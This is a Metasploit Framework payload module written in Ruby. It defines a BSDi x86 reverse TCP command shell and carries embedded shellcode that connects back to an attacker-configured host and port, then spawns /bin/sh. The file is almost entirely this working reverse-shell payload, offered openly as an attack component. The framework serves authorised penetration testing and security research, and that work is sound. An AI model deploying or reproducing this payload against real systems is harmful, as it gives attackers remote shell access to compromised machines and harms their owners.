##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::ReverseTcp'

  #
  # Methods
  #

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'BSDi Command Shell, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'Author'        => [ 'skape', 'optyx' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsdi',
      'Arch'          => ARCH_X86,
      'Session'       => Msf::Sessions::CommandShell,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LHOST'    => [ 0x1c, 'ADDR' ],
              'LPORT'    => [ 0x23, 'n'    ],
            },
          'Payload' =>
            "\x89\xe5\x68\x00\x07\x00\xc3\xb8\x9a\x00\x00\x00\x99\x50\x89\xe6" +
            "\x52\x42\x52\x42\x52\x6a\x61\x58\xff\xd6\x97\x68\x7f\x00\x00\x01" +
            "\x68\x10\x02\xbf\xbf\x89\xe3\x6a\x10\x53\x57\x6a\x62\x58\xff\xd6" +
            "\xb0\x5a\x52\x57\xff\xd6\x4a\x79\xf7\x50\x68\x2f\x2f\x73\x68\x68" +
            "\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\xb0\x3b\xff\xd6"
        }
    ))
  end

end
